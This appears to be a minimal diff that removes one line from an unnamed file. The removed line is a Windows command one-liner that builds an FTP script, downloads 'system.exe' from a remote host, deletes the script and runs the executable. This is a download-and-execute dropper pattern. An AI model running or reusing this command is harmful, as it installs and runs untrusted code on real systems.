@@ -1,1 +1,0 @@
-cmd /c echo open 0.0.0.0 25900 >> ii &echo user 1 1 >> ii &echo get system.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &system.exe
